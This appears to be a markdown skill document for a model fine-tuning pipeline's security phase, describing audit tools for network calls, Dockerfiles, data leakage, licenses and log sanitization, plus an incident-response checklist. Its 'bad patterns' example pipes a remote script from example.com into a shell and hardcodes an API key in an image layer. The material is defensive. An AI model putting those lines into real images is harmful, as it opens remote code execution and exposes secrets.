# Phase 6 — Security & Audit

> Tools 33-38 | Class: C3 (33, 34, 35, 36, 38) + C1 (37)
> Back: [SKILL.md](../SKILL.md)

---

## Purpose

Perform exhaustive security audits on all artefacts produced by the pipeline
before any real training or delivery. Audits run in parallel with Phases 3-4,
not strictly sequentially. The security report (tool 37) is a contractual
deliverable.

**C3 class:** these tools analyze our own artefacts (code, Dockerfile, logs)
using static analysis — they never touch real client data.

---

## Inputs

- Training code (`src/train.py`, `src/eval.py`, etc.)
- `docker/Dockerfile.train`
- Log files / artefacts from prior phases (already sanitized)
- Model `repo_id` (for license check)

## Outputs

- Code network-call audit report
- Dockerfile security report
- Data leakage scan report
- License verification result
- Security report (MD + PDF + SHA256)

---

## Tool Sequence

### Step 1 — Audit training code for network calls (C3)

```
audit_code_no_network(
    code_path=".../src/",
    allowlist=["huggingface.co", "cdn.huggingface.co"]
)
# → {findings: [], verdict: "PASS"} or {findings: [{line: 42, call: "requests.get(...)", severity: "CRITICAL"}]}
```

**What it checks (AST analysis):**
- `requests`, `urllib`, `httpx`, `socket`, `subprocess` with network targets
- `open()` on paths outside project directory (potential exfiltration)
- Any import not in the allowlist that resolves to a network library

Severity levels: CRITICAL (blocks), HIGH (warn), MEDIUM (inform).

### Step 2 — Audit Dockerfile (C3)

```
audit_dockerfile_security(dockerfile_path=".../docker/Dockerfile.train")
# → {findings: [{line: 5, issue: "running as root", severity: "HIGH"}], verdict: "WARN"}
```

**Checks:**
- `USER` directive → non-root required
- No `ADD https://...` or `curl | sh` patterns (remote code execution risk)
- No `ENV SECRET=...` or `ARG PASSWORD=...` (secrets in image layers)
- Base image pinned (no `:latest` tag)
- `RUN apt-get` with `--no-install-recommends` and `rm -rf /var/lib/apt/lists/*`

### Step 3 — Scan for data leakage risk (C3)

```
scan_data_leakage_risk(logs_path=".../outputs/")
# → {risks: [], verdict: "CLEAN"} or {risks: [{pattern: "email", location: "outputs/train.log:42"}]}
```

Applies `sanitize.py` heuristics to detect: emails, IPs, URLs with credentials,
base64 blobs > 100 chars, quoted strings > N chars (configurable). Checks
all files in the outputs/ and reports/ directories.

### Step 4 — Verify model license (C3)

```
verify_model_license(repo_id="Qwen/Qwen3-7B")
# → {license: "Apache-2.0", commercial_ok: true, attribution_required: false}
```

**License decision table** (see [sota-may-2026.md](sota-may-2026.md) §14.1):

| License | Commercial OK | Note |
|---------|--------------|------|
| Apache-2.0 | Yes | No restrictions |
| MIT | Yes | No restrictions |
| Llama Community | Check MAU clauses | Audit for >700M MAU restriction |
| Gemma License | Check restrictions | No redistribution as base model |
| CC-BY-NC | **No** | Non-commercial only |
| Proprietary | Case by case | Require written license from owner |

### Step 5 — Sanitize logs (C3) — CONTINUOUS TOOL

```
sanitize_logs_for_claude(text="<any log output>")
# → {sanitized: "<masked output>", masked_count: 3}
```

Call this **every time** external text (shell output, SSH logs, eval output)
enters the operator's context before passing to Claude. Not just a one-time
Phase 6 action — a continuous reflex throughout all C2 operations.

### Step 6 — Generate security report (C1)

```
generate_security_report(project_id="acme-ft-001")
# → {report_md: ".../reports/security_report.md", report_pdf: ".../reports/security_report.pdf", sha256: "..."}
```

Aggregates all audit findings (code, Dockerfile, leakage, license) into a
single deliverable report. Signed with SHA256. This report is:
- **Contractual deliverable** (listed in delivery note)
- **Client-facing proof** of Zero-Data compliance
- **Billing milestone** trigger (end of "Pipeline & preuve synthétique" phase)

---

## Go/No-Go Gate

- [ ] `audit_code_no_network` → 0 CRITICAL findings (or explicit documented exception)
- [ ] `audit_dockerfile_security` → 0 CRITICAL, no HIGH without documented remediation
- [ ] `scan_data_leakage_risk` → 0 risks in outputs/
- [ ] `verify_model_license` → `commercial_ok: true`
- [ ] `generate_security_report` generated (MD + PDF), SHA256 recorded in `events.jsonl`

---

## Docker Hardening Checklist

```dockerfile
# GOOD: hardened Dockerfile
FROM pytorch/pytorch:2.4.0-cuda12.1-cudnn9-devel@sha256:<pinned-digest>
RUN groupadd -r trainer && useradd -r -g trainer trainer
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY src/ ./src/
USER trainer
ENTRYPOINT ["python", "src/train.py"]
```

**Bad patterns to catch:**
```dockerfile
# BAD: root user, curl|sh, unpinned image, secret in env
FROM pytorch/pytorch:latest          # unpinned
RUN curl https://example.com | sh   # remote code exec
ENV API_KEY=sk-1234                  # secret in layer
USER root                            # privilege escalation
```

---

## Incident Response — Suspected Data Leak

If `scan_data_leakage_risk` or `detect_anomalies` raises a CRITICAL data leak:

1. **STOP** — do not proceed with delivery
2. Call `sanitize_logs_for_claude` on all recent outputs
3. Call `scan_data_leakage_risk` on all `outputs/`, `reports/`, `deliverables/`
4. Document in `events.jsonl` via `log_project_event`
5. Notify client per contract (art. 33-34 RGPD if personal data involved)
6. Purge affected files; re-run pipeline from clean state
7. Re-run `generate_security_report` and have client approve

See [legal-compliance.md](legal-compliance.md) §RGPD art. 33-34 for notification obligations.
